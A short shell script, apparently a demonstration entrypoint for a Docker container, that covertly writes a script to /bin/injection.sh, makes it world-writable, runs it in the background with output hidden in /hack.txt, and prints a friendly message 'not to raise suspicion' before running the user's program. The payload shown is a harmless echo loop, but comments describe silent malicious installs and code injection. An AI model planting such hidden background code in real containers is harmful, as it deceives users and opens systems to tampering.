#!/bin/sh



# Do some distructive actoins, in a subtle way...
# Possibilities include:
# Running malicious program,
# Installing from malicious repo using (apt-get install -qq) and silencing
# Injecting code elsewhere
# To name a few

INJECTION_SCRIPT='
    watch -n 10 echo "Im injection.sh and im running!!!! \n"
'

echo "$INJECTION_SCRIPT" >> /bin/injection.sh

chmod 777 /bin/injection.sh


/bin/bash /bin/injection.sh > /hack.txt 2>&1 &

# Do normal stuff not to raise suspicion...

echo "Hello, i'm running your programs for you..."


exec $DOCKER_PROGRAM_TO_RUN